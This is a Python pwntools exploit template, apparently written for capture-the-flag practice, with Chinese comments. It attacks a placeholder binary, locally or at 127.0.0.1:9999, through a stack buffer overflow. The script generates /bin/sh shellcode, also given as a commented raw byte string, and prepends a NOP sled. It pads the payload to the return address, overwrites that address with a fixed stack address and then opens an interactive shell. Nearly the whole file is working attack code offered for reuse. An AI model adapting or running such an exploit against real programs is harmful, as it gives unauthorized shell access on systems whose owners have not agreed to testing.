#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shellcode Template - Code Injection
Author: CTF Player
Date: 2025-01-XX
Target: target_binary
"""

from pwn import *

# 设置目标程序
binary = "./target"
elf = ELF(binary)

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("127.0.0.1", 9999)
    else:
        p = process(binary)
    
    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')
    
    # 生成shellcode
    shellcode = asm(shellcraft.sh())  # 生成获取shell的shellcode
    
    # 或者使用自定义shellcode
    # shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    
    log.info(f"Shellcode length: {len(shellcode)}")
    log.info(f"Shellcode: {shellcode.hex()}")
    
    # 构造payload
    nop_sled = b"\x90" * 100  # NOP滑板
    payload = nop_sled + shellcode
    payload += b"A" * (72 - len(payload))  # 填充到返回地址
    payload += p64(0x7fffffffe000)  # 跳转到shellcode地址
    
    # 发送payload
    p.sendline(payload)
    
    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
